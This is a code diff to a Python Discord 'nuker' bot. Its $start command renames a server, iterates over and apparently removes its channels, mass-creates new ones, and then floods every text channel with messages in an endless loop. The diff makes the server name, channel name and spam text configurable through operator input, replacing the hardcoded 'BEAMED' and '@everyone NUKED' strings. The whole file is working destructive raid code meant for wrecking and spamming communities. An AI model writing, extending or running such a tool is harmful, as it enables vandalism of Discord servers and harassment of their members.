@@ -5,7 +5,6 @@ import time
 from discord.ext import commands
 
 BOT_PREFIX = "$"
-channel_names = ["Beamed by Sudo"]
 
 bot = commands.Bot(command_prefix=BOT_PREFIX, case_insensitive=True)
 bot.remove_command('Help')
@@ -40,8 +39,14 @@ async def start(ctx):
     await ctx.message.delete()
     guild = ctx.guild
 
-    await ctx.guild.edit(name="BEAMED")
-    print("[+] Server named changed")
+    server_name = input("[+] Enter server name here: ")
+    channel = input("[+] Enter channel name here: ")
+    spam_txt = input("[+] Enter text to spam here: ")
+    
+    channel_names = [channel]
+
+    await ctx.guild.edit(name=server_name)
+    print(f"[+] Server named changed to {server_name}")
 
     for channel in list(ctx.message.guild.channels):
         try:
@@ -56,11 +61,12 @@ async def start(ctx):
             for i in range(30):
                 await guild.create_text_channel(random.choice(channel_names))
     print("[+] New channels have been made")
+
     time.sleep(1)
     print("[+] Spamming server")
     while True:
         for channel in guild.text_channels:
-            await channel.send("@everyone NUKED")
+            await channel.send(f"{spam_txt}")
 
 try:
     bot.run(token)
